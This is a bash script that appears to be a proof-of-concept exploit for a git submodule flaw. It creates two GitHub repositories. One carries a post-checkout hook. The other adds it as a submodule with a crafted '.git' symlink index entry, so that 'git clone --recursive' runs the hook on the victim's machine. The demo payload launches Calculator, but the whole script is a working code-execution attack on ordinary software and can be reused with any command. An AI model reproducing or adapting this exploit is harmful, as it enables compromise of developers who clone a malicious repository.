#!/bin/bash

REP1="https://github.com/FlojBoj/rep1.git"
REP2="https://github.com/FlojBoj/rep2.git"

exploit="/System/Applications/Calculator.app/Contents/MacOS/Calculator"

mkdir exploit
cd exploit

git clone "$REP1" rep1
git clone "$REP2" rep2

cd rep1/
mkdir -p executable/hooks
echo "#!/bin/bash
$exploit" > executable/hooks/post-checkout
git add executable/hooks/post-checkout
git update-index --chmod=+x executable/hooks/post-checkout
git commit -m "REP1"
git push
cd ..

cd rep2/
git submodule add --name exploit/executable "$REP1" A/modules/exploit
git commit -m "REP1"
printf .git > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "REP2"
git push

cd ../..
rm -rf exploit

echo "[*] Exploit - \"git clone --recursive $REP2\""